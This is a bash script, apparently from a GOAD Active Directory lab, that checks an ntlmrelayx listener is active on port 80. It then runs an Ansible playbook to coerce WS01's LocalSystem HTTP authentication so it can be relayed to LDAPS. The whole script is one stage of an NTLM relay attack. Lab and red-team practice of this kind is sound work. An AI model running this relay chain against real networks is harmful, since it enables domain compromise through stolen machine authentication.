#!/usr/bin/env bash
# Trigger one deterministic WS01 LocalSystem HTTP authentication against the read-only relay.
set -euo pipefail

ROOT="${ROOT:-$HOME/Documents/GOAD_NOMAD}"
WORK="${WORK:-$HOME/.config/kingdoms/phase03-http-ldaps}"
PIDFILE="$WORK/ntlmrelayx.pid"
PLAYBOOK="$ROOT/ansible/phase03-trigger-ws01-system-http.yml"
DATA_INVENTORY="${KINGDOMS_PHASE03_DATA_INVENTORY:-$ROOT/ad/GOAD/data/inventory}"
PROVIDER_INVENTORY="${KINGDOMS_PHASE03_PROVIDER_INVENTORY:-$ROOT/ad/GOAD/providers/vmware/inventory}"

find_ansible_playbook() {
  local c
  for c in     "$(command -v ansible-playbook 2>/dev/null || true)"     "$ROOT/.venv/bin/ansible-playbook"     "$HOME/.goad/.venv/bin/ansible-playbook"; do
    [[ -n "$c" && -x "$c" ]] || continue
    printf '%s\n' "$c"
    return 0
  done
  return 1
}

listener_pid_80() {
  sudo ss -H -lntp 'sport = :80' 2>/dev/null     | sed -n 's/.*pid=\([0-9][0-9]*\).*/\1/p'     | head -n1
}

pid_cmdline() {
  local pid="$1"
  sudo sh -c "tr '\\0' ' ' < /proc/$pid/cmdline" 2>/dev/null || true
}

# Fail before any WS01 interaction if an explicitly selected inventory is missing.
[[ -f "$DATA_INVENTORY" && -f "$PROVIDER_INVENTORY" ]] || {
  echo 'FAIL: Phase 03 inventory input is missing' >&2
  exit 2
}

cd "$ROOT"

sudo -v

PID=""
if [[ -f "$PIDFILE" ]]; then
  PID="$(cat "$PIDFILE")"
fi

if [[ -z "$PID" ]] || ! sudo kill -0 "$PID" 2>/dev/null; then
  PID="$(listener_pid_80 || true)"

  if [[ -z "$PID" ]]; then
    echo 'FAIL: HTTP relay runtime is not active' >&2
    exit 1
  fi

  CMDLINE="$(pid_cmdline "$PID")"

  if ! grep -Eqi 'ntlmrelayx' <<<"$CMDLINE"; then
    echo "FAIL: TCP/80 is owned by a non-ntlmrelayx process: PID=$PID CMDLINE=$CMDLINE" >&2
    exit 1
  fi

  printf '%s\n' "$PID" >"$PIDFILE"
  echo "INFO: recovered live ntlmrelayx listener PID=$PID"
else
  CMDLINE="$(pid_cmdline "$PID")"

  if ! grep -Eqi 'ntlmrelayx' <<<"$CMDLINE"; then
    echo "FAIL: pidfile PID $PID is not ntlmrelayx: $CMDLINE" >&2
    exit 1
  fi
fi

LISTENER_PID="$(listener_pid_80 || true)"
[[ "$LISTENER_PID" == "$PID" ]] || {
  echo "FAIL: ntlmrelayx PID $PID is not the current TCP/80 listener" >&2
  exit 1
}

echo "PHASE03_HTTP_LDAPS_RELAY_PID=$PID"
echo 'PASS: HTTP relay runtime is active'

ANSIBLE_PLAYBOOK="$(find_ansible_playbook || true)"
[[ -n "$ANSIBLE_PLAYBOOK" ]] || { echo 'FAIL: ansible-playbook not found' >&2; exit 1; }

ANSIBLE_CONFIG="$ROOT/ansible/ansible.cfg" "$ANSIBLE_PLAYBOOK"   -i "$DATA_INVENTORY"   -i "$PROVIDER_INVENTORY"   "$PLAYBOOK"

echo 'PHASE03_HTTP_LDAPS_TRIGGER_COMPLETE=True'
